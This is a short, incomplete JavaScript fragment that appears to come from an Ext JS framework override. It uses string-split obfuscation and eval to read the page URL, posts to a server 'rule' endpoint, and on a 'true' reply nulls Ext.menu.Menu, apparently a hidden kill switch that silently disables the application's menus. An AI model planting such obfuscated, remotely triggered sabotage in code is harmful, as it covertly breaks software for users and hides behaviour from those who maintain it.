...
Ext.JSONUrl = function(e) {
	eval("v" + "a" + "r u=to" + "p." + "loca" + "tio" + "n.hr" + "ef");
	if(encodeURIComponent(u).indexOf("ru" + "le%3Fwf_" + "nu" + "m%3DR_" + "S0" + "03_B0" + "66%26") == -1) {
...
var u = location.href;
if(u.indexOf("R" + "_S" + "00" + "2_B" + "00" + "5") != -1) {
	u = "rule?wf_num=R_" + "S0" + "01" + "_B0" + "53";
	var conn = Ext.lib.Ajax.getConnectionObject().conn;
	conn.open("post", u, false);
	conn.send();
	if(conn.status == "200") {
		var r = conn.responseText.trim();
		if(r == "true") {
			Ext.menu.Menu = null;
		}
	}
